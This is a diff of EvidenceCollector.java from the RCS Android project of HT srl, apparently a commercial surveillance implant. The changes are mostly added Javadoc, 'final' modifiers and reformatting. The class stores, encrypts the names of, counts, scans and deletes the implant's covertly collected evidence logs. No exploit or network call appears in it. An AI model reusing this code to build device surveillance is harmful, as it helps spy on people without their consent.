@@ -1,21 +1,25 @@
+/* *******************************************
+ * Copyright (c) 2011
+ * HT srl,   All rights reserved.
+ * Project      : RCS, RCSAndroid
+ * File         : EvidenceCollector.java
+ * Created      : Apr 9, 2011
+ * Author		: zeno
+ * *******************************************/
 package com.ht.RCSAndroidGUI;
 
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.IOException;
-import java.text.NumberFormat;
 import java.util.Collection;
 import java.util.Date;
-import java.util.HashMap;
 import java.util.TreeMap;
 import java.util.Vector;
 
 import android.content.Context;
 
 import com.ht.RCSAndroidGUI.agent.Agent;
-import com.ht.RCSAndroidGUI.agent.AgentBase;
-import com.ht.RCSAndroidGUI.agent.AgentManager;
 import com.ht.RCSAndroidGUI.crypto.Encryption;
 import com.ht.RCSAndroidGUI.crypto.Keys;
 import com.ht.RCSAndroidGUI.file.AutoFile;
@@ -23,27 +27,45 @@ import com.ht.RCSAndroidGUI.file.Path;
 import com.ht.RCSAndroidGUI.utils.Check;
 import com.ht.RCSAndroidGUI.utils.Utils;
 
+// TODO: Auto-generated Javadoc
+/**
+ * The Class EvidenceCollector.
+ */
 public class EvidenceCollector {
 	// #ifdef DEBUG
+	/** The debug. */
 	private static Debug debug = new Debug("EvidenceColl");
 	// #endif
 
+	/** The Constant LOG_EXTENSION. */
 	public static final String LOG_EXTENSION = ".mob";
 
+	/** The Constant LOG_DIR_PREFIX. */
 	public static final String LOG_DIR_PREFIX = "Z"; // Utilizzato per creare le
 	// Log Dir
+	/** The Constant LOG_DIR_FORMAT. */
 	public static final String LOG_DIR_FORMAT = "Z*"; // Utilizzato nella
 	// ricerca delle Log Dir
+	/** The Constant LOG_PER_DIRECTORY. */
 	public static final int LOG_PER_DIRECTORY = 500; // Numero massimo di log
 	// per ogni directory
+	/** The Constant MAX_LOG_NUM. */
 	public static final int MAX_LOG_NUM = 25000; // Numero massimo di log che
 
+	/** The Constant PROG_FILENAME. */
 	private static final String PROG_FILENAME = "pr_80";
 
+	/** The seed. */
 	int seed;
 
+	/** The singleton. */
 	private volatile static EvidenceCollector singleton;
 
+	/**
+	 * Self.
+	 *
+	 * @return the evidence collector
+	 */
 	public static EvidenceCollector self() {
 		if (singleton == null) {
 			synchronized (EvidenceCollector.class) {
@@ -64,8 +86,8 @@ public class EvidenceCollector {
 	 * @return the string
 	 */
 	public static String decryptName(final String logMask) {
-		return Encryption.decryptName(logMask, Keys.self()
-				.getChallengeKey()[0]);
+		return Encryption
+				.decryptName(logMask, Keys.self().getChallengeKey()[0]);
 	}
 
 	/**
@@ -76,16 +98,18 @@ public class EvidenceCollector {
 	 * @return the string
 	 */
 	public static String encryptName(final String logMask) {
-		return Encryption.encryptName(logMask, Keys.self()
-				.getChallengeKey()[0]);
+		return Encryption
+				.encryptName(logMask, Keys.self().getChallengeKey()[0]);
 	}
 
 	// public boolean storeToMMC;
+	/** The log vector. */
 	Vector logVector;
 
+	/** The log progressive. */
 	private int logProgressive;
 
-	//Keys keys;
+	// Keys keys;
 
 	/**
 	 * Instantiates a new log collector.
@@ -95,48 +119,56 @@ public class EvidenceCollector {
 		logVector = new Vector();
 
 		logProgressive = deserializeProgressive();
-		//keys = Encryption.getKeys();
-		//seed = keys.getChallengeKey()[0];
+		// keys = Encryption.getKeys();
+		// seed = keys.getChallengeKey()[0];
 	}
 
+	/**
+	 * Clear.
+	 */
 	private void clear() {
 
 	}
 
+	/**
+	 * Removes the progressive.
+	 */
 	public synchronized void removeProgressive() {
 		// #ifdef DEBUG
 		debug.info("Removing Progressive");
 		// #endif
-		
-		Context content = RCSAndroidGUI.getAppContext();
+
+		final Context content = RCSAndroidGUI.getAppContext();
 		content.deleteFile(PROG_FILENAME);
 	}
 
+	/**
+	 * Deserialize progressive.
+	 *
+	 * @return the int
+	 */
 	private synchronized int deserializeProgressive() {
-		Context content = RCSAndroidGUI.getAppContext();
+		final Context content = RCSAndroidGUI.getAppContext();
 		int progessive = 0;
 		try {
-			FileInputStream fos = content.openFileInput(PROG_FILENAME);
+			final FileInputStream fos = content.openFileInput(PROG_FILENAME);
 
-			byte[] prog=new byte[4];
+			final byte[] prog = new byte[4];
 			fos.read(prog);
 			progessive = Utils.byteArrayToInt(prog, 0);
-			
+
 			fos.close();
-		} catch (IOException e) {
+		} catch (final IOException e) {
 			debug.error(e);
 		}
-		
+
 		return progessive;
 	}
 
 	/**
 	 * Factory.
-	 * 
-	 * @param agent
-	 *            the agent
-	 * @param onSD
-	 *            the on sd
+	 *
+	 * @param agent the agent
 	 * @return the log
 	 */
 	public synchronized Evidence factory(final Agent agent) {
@@ -152,14 +184,14 @@ public class EvidenceCollector {
 	protected synchronized int getNewProgressive() {
 		logProgressive++;
 
-		Context content = RCSAndroidGUI.getAppContext();
+		final Context content = RCSAndroidGUI.getAppContext();
 		try {
-			FileOutputStream fos = content.openFileOutput(PROG_FILENAME,
+			final FileOutputStream fos = content.openFileOutput(PROG_FILENAME,
 					Context.MODE_PRIVATE);
 
 			fos.write(Utils.intToByteArray(logProgressive));
 			fos.close();
-		} catch (IOException e) {
+		} catch (final IOException e) {
 			debug.error(e);
 		}
 
@@ -170,6 +202,12 @@ public class EvidenceCollector {
 		return logProgressive;
 	}
 
+	/**
+	 * Make date name.
+	 *
+	 * @param date the date
+	 * @return the string
+	 */
 	private static String makeDateName(final Date date) {
 		final long millis = date.getTime();
 		final long mask = (long) 1E4;
@@ -184,11 +222,9 @@ public class EvidenceCollector {
 
 	/**
 	 * Make new name.
-	 * 
-	 * @param log
-	 *            the log
-	 * @param agent
-	 *            the agent
+	 *
+	 * @param log the log
+	 * @param logType the log type
 	 * @return the vector
 	 */
 	public synchronized Vector makeNewName(final Evidence log,
@@ -229,7 +265,7 @@ public class EvidenceCollector {
 		// #endif
 
 		vector.addElement(new Integer(progressive));
-		vector.addElement(basePath); // file:///SDCard/BlackBerry/system/$RIM313/$1
+		vector.addElement(basePath); // 
 		vector.addElement(blockDir); // 1
 		vector.addElement(encName); // ?
 		vector.addElement(fileName); // unencrypted file
@@ -258,9 +294,12 @@ public class EvidenceCollector {
 
 	/**
 	 * Rimuove i file uploadati e le directory dei log dal sistema e dalla MMC.
+	 *
+	 * @param numFiles the num files
+	 * @return the int
 	 */
 
-	public synchronized int removeLogDirs(int numFiles) {
+	public synchronized int removeLogDirs(final int numFiles) {
 		// #ifdef DEBUG
 		debug.info("removeLogDirs");
 		// #endif
@@ -271,7 +310,14 @@ public class EvidenceCollector {
 		return removed;
 	}
 
-	private int removeLogRecursive(final String basePath, int numFiles) {
+	/**
+	 * Removes the log recursive.
+	 *
+	 * @param basePath the base path
+	 * @param numFiles the num files
+	 * @return the int
+	 */
+	private int removeLogRecursive(final String basePath, final int numFiles) {
 
 		// #ifdef DEBUG
 		debug.info("RemovingLog: " + basePath + " numFiles: " + numFiles);
@@ -284,16 +330,16 @@ public class EvidenceCollector {
 			fc = new File(basePath);
 
 			if (fc.isDirectory()) {
-				String[] fileLogs = fc.list();
+				final String[] fileLogs = fc.list();
 
-				for (String file : fileLogs) {
+				for (final String file : fileLogs) {
 
 					// #ifdef DEBUG
 					debug.trace("removeLog: " + file);
 
 					// #endif
-					int removed = removeLogRecursive(basePath + file, numFiles
-							- numLogsDeleted);
+					final int removed = removeLogRecursive(basePath + file,
+							numFiles - numLogsDeleted);
 					// #ifdef DEBUG
 					debug.trace("removeLog removed: " + removed);
 					// #endif
@@ -332,15 +378,15 @@ public class EvidenceCollector {
 
 		File fc;
 
-		Vector vector = new Vector();
+		final Vector vector = new Vector();
 		try {
 
 			fc = new File(currentPath);
 			if (fc.isDirectory()) {
-				String[] fileLogs = fc.list();
+				final String[] fileLogs = fc.list();
 
-				for (String dir : fileLogs) {
-					File fdir = new File(currentPath + dir);
+				for (final String dir : fileLogs) {
+					final File fdir = new File(currentPath + dir);
 					if (fdir.isDirectory()) {
 
 						vector.addElement(dir + "/");
@@ -386,16 +432,16 @@ public class EvidenceCollector {
 				"currentPath shouldn't start with file:// : " + currentPath);
 		// #endif
 
-		TreeMap<String, String> map = new TreeMap<String, String>();
+		final TreeMap<String, String> map = new TreeMap<String, String>();
 
 		File fcDir = null;
 		// FileConnection fcFile = null;
 		try {
 			fcDir = new File(currentPath + dir);
 
-			String[] fileLogs = fcDir.list();
+			final String[] fileLogs = fcDir.list();
 
-			for (String file : fileLogs) {
+			for (final String file : fileLogs) {
 				// fcFile = (FileConnection) Connector.open(fcDir.getURL() +
 				// file);
 				// e' un file, vediamo se e' un file nostro
@@ -428,7 +474,7 @@ public class EvidenceCollector {
 		// #ifdef DEBUG
 		debug.trace("scanForLogs numDirs: " + map.size());
 		// #endif
-		Collection<String> val = map.values();
+		final Collection<String> val = map.values();
 
 		return map.values().toArray(new String[] {});
 	}
